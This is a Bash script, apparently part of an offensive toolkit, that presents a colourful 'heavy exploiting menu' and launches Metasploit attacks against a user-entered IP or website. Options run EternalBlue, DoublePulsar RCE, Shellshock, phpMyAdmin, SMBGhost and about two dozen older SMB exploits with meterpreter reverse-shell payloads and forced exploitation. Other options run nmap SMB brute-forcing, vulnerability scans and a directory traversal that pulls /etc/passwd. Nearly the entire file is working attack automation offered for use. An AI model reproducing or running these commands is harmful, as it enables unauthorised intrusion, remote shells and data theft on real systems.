#!/bin/bash
clear

# COLORS

blue='\033[94m'
red='\033[91m'
green='\033[92m'
orange='\033[93m'
reset='\e[0m'
magenta='\u001b[35m'
yellow='\u001b[33m'

# DEVELOPER

clear
    sleep 1.0
echo -e "$red[$reset$blue*$reset$red]$reset$yellow Coded by:$reset$magenta"
figlet -f big "vDroPZz"
    sleep 1.0
        clear
echo -e "$red[$reset$blue*$reset$red]$reset$yellow Contacts:$reset$magenta"
figlet -f small "GitHub:"
figlet -f big "DroPZsec"
echo -e $reset
    sleep 1.0
echo -e "$red[$reset$blue*$reset$red]$reset$green Contact me there if you have a question!$reset"
    sleep 2.0
clear

# CODE

sleep 1.0
echo -e "$orange###########################"
echo -e "#                         #"
echo -e "#$reset$blue   --[SMBSPLOITING]-- $reset$orange   #"
echo -e "#     $reset$blue by vDroPZz  $reset$orange       #"
echo -e "#                         #"
echo -e "###########################$reset"
    sleep 1.0
echo ""
echo ""
echo -e "$magenta"
figlet -f small HEAVY EXPLOITING MENU
    sleep 1.0
echo ""
echo ""
echo -e "$reset"
    sleep 1.0
echo ""
echo ""
echo -e "$red[$reset$blue 01 $reset$red]$reset$green ETERNALBLUE$reset"
    sleep 0.5
echo -e "$red[$reset$blue 02 $reset$red]$reset$green DOUBLEPULSAR RCE$reset"
    sleep 0.5
echo -e "$red[$reset$blue 03 $reset$red]$reset$green SMB-NSE-BRUTE$reset"
    sleep 0.5
echo -e "$red[$reset$blue 04 $reset$red]$reset$green SLOWLORIS-DOS VULN SCAN$reset"
    sleep 0.5
echo -e "$red[$reset$blue 05 $reset$red]$reset$green SMB VULN SCAN$reset"
    sleep 0.5
echo -e "$red[$reset$blue 06 $reset$red]$reset$green SHELLSHOCK$reset"
    sleep 0.5
echo -e "$red[$reset$blue 07 $reset$red]$reset$green PHP-VERSION SCAN$reset"
    sleep 0.5
echo -e "$red[$reset$blue 08 $reset$red]$reset$green PHPMYADMIN EXPLOITS$reset"
    sleep 0.5
echo -e "$red[$reset$blue 09 $reset$red]$reset$green MSF SMB EXPLOITING$reset"
    sleep 0.5
echo -e "$red[$reset$blue 00 $reset$red]$reset$green BACK$reset"
    sleep 0.5
echo ""
echo ""
echo ""
echo ""
echo -e "$green Your choice: $reset"
    read option;

if [ $option == 1 ]; then
    echo -e "$green Enter Target IP$reset $blue[192.168.0.0]: $reset"
        read ip; 
    msfconsole -q -x " use exploit/windows/smb/ms17_010_eternalblue; set payload windows/meterpreter/reverse_tcp; set RHOSTS $ip; set TARGET Windows 10 Pro; set RPORT 445; set forceexploit true; set LHOST eth0; run; exit; exit; "
    echo ""
    echo ""
    echo ""
    echo -e "$green Press ENTER to continue... $reset"
        read;
fi

if [ $option == 2 ]; then
    echo -e "$green Enter Target IP: $reset"
        read ip;
    nmap -p 445 $ip --script=smb-double-pulsar-backdoor.nse
    msfconsole -q -x " use exploit/windows/rdp/rdp_doublepulsar_rce; set payload windows/x64/meterpreter/reverse_tcp; set RHOSTS $ip; set RPORT 3389; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/windows/smb/smb_doublepulsar_rce; set payload windows/x64/meterpreter/reverse_tcp; set RHOSTS $ip; set RPORT 445; set DefangedMode false; set forceexploit true; set LHOST eth0; run; exit; exit; "
    echo ""
    echo ""
    echo ""
    echo -e "$green Press ENTER to continue... $reset"
        read;
fi

if [ $option == 3 ]; then
    echo -e "$green Enter Target IP: $reset"
        read ip;
    sudo nmap -sU -sS $ip --script smb-brute.nse -p U:137,T:139,445 
    sudo nmap -sU -sS $ip --script smb-enum-users.nse -p U:137,T:139,445
    sudo nmap -sU -sS $ip --script smb-system-info.nse -p U:137,T:139,445
    echo ""
    echo ""
    echo ""
    echo -e "$green Press ENTER to continue... $reset"
        read;
fi

if [ $option == 4 ]; then
    echo -e "$green Enter Target IP: $reset"
        read ip;
    nmap $ip --script http-slowloris-check
    echo ""
    echo ""
    echo ""
    echo -e "$green Press ENTER to continue... $reset"
        read;
fi

if [ $option == 5 ]; then
    echo -e "$green Enter Target IP: $reset"
        read ip;
    sudo nmap -sU $ip --script smb-vuln-cve2009-3103.nse -p U:137,T:139,445
    nmap $ip --script smb-vuln-cve-2017-7494 --script-args smb-vuln-cve-2017-7494.check-version -p445 
    sudo nmap -sU $ip --script smb-vuln-ms06-025.nse -p U:137,T:139,445
    sudo nmap -sU $ip --script smb-vuln-ms07-029.nse -p U:137,T:139,445
    sudo nmap -sU $ip --script smb-vuln-ms08-067.nse -p U:137,T:139,445
    nmap -p 445 $ip --script=smb-vuln-ms10-054 --script-args unsafe
    nmap -p 445 $ip --script=smb-vuln-ms10-061
    nmap -p 445 $ip --script smb-vuln-ms17-010
    sudo nmap -sU $ip --script smb-vuln-regsvc-dos.nse -p U:137,T:139,445
    echo ""
    echo ""
    echo ""
    echo -e "$green Press ENTER to continue... $reset"
        read;
fi

if [ $option == 6 ]; then
    echo -e "$green Enter Target Website$reset $blue[www.website.com]: $reset"
        read website;
    echo -e "$green Enter Target Port$reset $blue[80forHTTP,443forHTTPS]: $reset"
        read port;
    nmap -sV -p 80,443 $website --script http-shellshock
    nmap -sV -p 80,443 $website --script http-shellshock --script-args uri=/cgi-bin/bin,cmd=ls
    msfconsole -q -x " use exploit/linux/http/advantech_switch_bash_env_exec; set payload cmd/unix/generic; set cmd ls; set RHOSTS $website; set forceexploit true; run; exit; exit; "
    msfconsole -q -x " use exploit/unix/dhcp/bash_environment; set SRVHOST $website; set payload payload/cmd/unix/generic;set AllowNoCleanup true; set NETMASK 0.0.0.0; set cmd ls; set forceexploit true; run; exit; exit; "
    msfconsole -q -x " use exploit/multi/ftp/pureftpd_bash_env_exec; set payload linux/x86/meterpreter/reverse_tcp; set RHOSTS $website; set LHOST eth0; set forceexploit true; run; exit; exit; "
    echo ""
    echo ""
    echo ""
    echo -e "$green Press ENTER to continue... $reset"
        read;
fi

if [ $option == 7 ]; then
    echo -e "$green Enter Target Website$reset $blue[www.website.com]: $reset"
        read website;
    nmap -p 80 -sV $website --script=http-php-version.nse
    echo ""
    echo ""
    echo ""
    echo -e "$green Press ENTER to continue... $reset"
        read;
fi

if [ $option == 8 ]; then
    echo -e "$green Enter Target Website$reset $blue[www.website.com]: $reset"
        read website;
    echo -e "$green Enter Target Port$reset $blue[80forHTTP,443forHTTPS]: $reset"
        read port;
    nmap -p 80,443 $website --script http-phpmyadmin-dir-traversal
    nmap -p 80,443 $website --script http-phpmyadmin-dir-traversal --script-args="dir='/pma/',file='../../../../../../../../etc/passwd',outfile='passwd.txt'"
    msfconsole -q -x " use exploit/unix/webapp/phpmyadmin_config; set payload php/meterpreter/reverse_tcp; set RHOSTS $website; set RPORT $port; set forceexploit true; set LHOST eth0; set LPORT 4444; run; exit; exit; "
    msfconsole -q -x " use exploit/multi/http/zpanel_information_disclosure_rce; set payload php/meterpreter/reverse_tcp; set RHOSTS $website; set RPORT $port; set forceexploit true; set LHOST eth0; set LPORT 4444; run; exit; exit; "
    msfconsole -q -x " use exploit/multi/http/phpmyadmin_3522_backdoor; set payload php/meterpreter/reverse_tcp; set RHOSTS $website; set RPORT $port; set forceexploit true; set LHOST eth0; set LPORT 4444; run; exit; exit; "
    msfconsole -q -x " use exploit/multi/http/phpmyadmin_lfi_rce; set payload php/meterpreter/reverse_tcp; set RHOSTS $website; set RPORT $port; set forceexploit true; set LHOST eth0; set LPORT 4444; run; exit; exit; "
    msfconsole -q -x " use exploit/multi/http/phpmyadmin_null_termination_exec; set payload php/meterpreter/reverse_tcp; set RHOSTS $website; set RPORT $port; set forceexploit true; set LHOST eth0; set LPORT 4444; run; exit; exit; "
    msfconsole -q -x " use exploit/multi/http/phpmyadmin_preg_replace; set payload php/meterpreter/reverse_tcp; set RHOSTS $website; set RPORT $port; set forceexploit true; set LHOST eth0; set LPORT 4444; run; exit; exit; "
    echo ""
    echo ""
    echo ""
    echo -e "$green Press ENTER to continue... $reset"
        read;
fi

if [ $option == 9 ]; then
    echo -e "$green Enter Target IP: $reset"
        read ip;
    sudo msfconsole -q -x " use exploit/windows/smb/generic_smb_dll_injection; set payload windows/meterpreter/reverse_tcp; set RHOSTS $ip; set forceexploit true; set LHOST eth0; set LPORT 4444; run; exit; exit; "
    sudo msfconsole -q -x " use exploit/windows/smb/ipass_pipe_exec; set payload windows/meterpreter/reverse_tcp; set RHOSTS $ip; set forceexploit true; set LHOST eth0; set LPORT 4444; run; exit; exit; "
    sudo msfconsole -q -x " use exploit/windows/smb/ms03_049_netapi; set payload windows/meterpreter/reverse_tcp; set RHOSTS $ip; set forceexploit true; set LHOST eth0; set LPORT 4444; run; exit; exit; "
    sudo msfconsole -q -x " use exploit/windows/smb/ms04_007_killbill; set payload windows/meterpreter/reverse_tcp; set RHOSTS $ip; set forceexploit true; set LHOST eth0; set LPORT 4444; run; exit; exit; "
    sudo msfconsole -q -x " use exploit/windows/smb/ms04_011_lsass; set payload windows/meterpreter/reverse_tcp; set RHOSTS $ip; set forceexploit true; set LHOST eth0; set LPORT 4444; run; exit; exit; "
    sudo msfconsole -q -x " use exploit/windows/smb/ms04_031_netdde; set payload windows/meterpreter/reverse_tcp; set RHOSTS $ip; set forceexploit true; set LHOST eth0; set LPORT 4444; run; exit; exit; "
    sudo msfconsole -q -x " use exploit/windows/smb/ms05_039_pnp; set payload windows/meterpreter/reverse_tcp; set RHOSTS $ip; set forceexploit true; set LHOST eth0; set LPORT 4444; run; exit; exit; "
    sudo msfconsole -q -x " use exploit/windows/smb/ms06_025_rras; set payload windows/meterpreter/reverse_tcp; set RHOSTS $ip; set forceexploit true; set LHOST eth0; set LPORT 4444; run; exit; exit; "
    sudo msfconsole -q -x " use exploit/windows/smb/ms06_025_rasmans_reg; set payload windows/meterpreter/reverse_tcp; set RHOSTS $ip; set forceexploit true; set LHOST eth0; set LPORT 4444; run; exit; exit; "
    sudo msfconsole -q -x " use exploit/windows/smb/ms06_040_netapi; set payload windows/meterpreter/reverse_tcp; set RHOSTS $ip; set forceexploit true; set LHOST eth0; set LPORT 4444; run; exit; exit; "
    sudo msfconsole -q -x " use exploit/windows/smb/ms06_066_nwapi; set payload windows/meterpreter/reverse_tcp; set RHOSTS $ip; set forceexploit true; set LHOST eth0; set LPORT 4444; run; exit; exit; "
    sudo msfconsole -q -x " use exploit/windows/smb/ms06_066_nwwks; set payload windows/meterpreter/reverse_tcp; set RHOSTS $ip; set forceexploit true; set LHOST eth0; set LPORT 4444; run; exit; exit; "
    sudo msfconsole -q -x " use exploit/windows/smb/ms06_070_wkssvc; set payload windows/meterpreter/reverse_tcp; set RHOSTS $ip; set forceexploit true; set LHOST eth0; set LPORT 4444; run; exit; exit; "
    sudo msfconsole -q -x " use exploit/windows/smb/ms07_029_msdns_zonename; set payload windows/meterpreter/reverse_tcp; set RHOSTS $ip; set forceexploit true; set LHOST eth0; set LPORT 4444; run; exit; exit; "
    sudo msfconsole -q -x " use exploit/windows/smb/ms08_067_netapi; set payload windows/meterpreter/reverse_tcp; set RHOSTS $ip; set forceexploit true; set LHOST eth0; set LPORT 4444; run; exit; exit; "
    sudo msfconsole -q -x " use exploit/windows/smb/smb_relay; set payload windows/meterpreter/reverse_tcp; set RHOSTS $ip; set forceexploit true; set LHOST eth0; set LPORT 4444; run; exit; exit; "
    sudo msfconsole -q -x " use exploit/windows/smb/ms09_050_smb2_negotiate_func_index; set payload windows/meterpreter/reverse_tcp; set RHOSTS $ip; set forceexploit true; set LHOST eth0; set LPORT 4444; run; exit; exit; "
    sudo msfconsole -q -x " use exploit/windows/smb/ms10_061_spoolss; set payload windows/meterpreter/reverse_tcp; set RHOSTS $ip; set forceexploit true; set LHOST eth0; set LPORT 4444; run; exit; exit; "
    sudo msfconsole -q -x " use exploit/windows/smb/ms17_010_psexec; set payload windows/meterpreter/reverse_tcp; set RHOSTS $ip; set forceexploit true; set LHOST eth0; set LPORT 4444; run; exit; exit; "
    sudo msfconsole -q -x " use exploit/windows/smb/psexec; set payload windows/meterpreter/reverse_tcp; set RHOSTS $ip; set forceexploit true; set LHOST eth0; set LPORT 4444; run; exit; exit; "
    sudo msfconsole -q -x " use exploit/windows/smb/smb_rras_erraticgopher; set payload windows/shell/reverse_tcp; set RHOSTS $ip; set forceexploit true; set LHOST eth0; set LPORT 4444; run; exit; exit; "
    sudo msfconsole -q -x " use exploit/windows/smb/netidentity_xtierrpcpipe; set payload windows/meterpreter/reverse_tcp; set RHOSTS $ip; set forceexploit true; set LHOST eth0; set LPORT 4444; run; exit; exit; "
    sudo msfconsole -q -x " use exploit/netware/smb/lsass_cifs; set payload netware/shell/reverse_tcp; set RHOSTS $ip; set forceexploit true; set LHOST eth0; set LPORT 4444; run; exit; exit; "
    sudo msfconsole -q -x " use exploit/windows/smb/cve_2020_0796_smbghost; set payload windows/x64/meterpreter/reverse_tcp; set RHOSTS $ip; set forceexploit true; set LHOST eth0; set LPORT 4444; run; exit; exit; "
    sudo msfconsole -q -x " use exploit/windows/smb/timbuktu_plughntcommand_bof; set payload windows/x64/meterpreter/reverse_tcp; set RHOSTS $ip; set forceexploit true; set LHOST eth0; set LPORT 4444; run; exit; exit; "
    sudo msfconsole -q -x " use exploit/windows/smb/webexec; set payload windows/meterpreter/reverse_tcp; set RHOSTS $ip; set forceexploit true; set LHOST eth0; set LPORT 4444; run; exit; exit; "
    echo ""
    echo ""
    echo ""
    echo -e "$green Press ENTER to continue... $reset"
        read;
fi
 
if [ $option == 0 ]; then
    cd ..
    ./bashtomation.sh
fi
 
./smbsploiting.sh
/bin/bash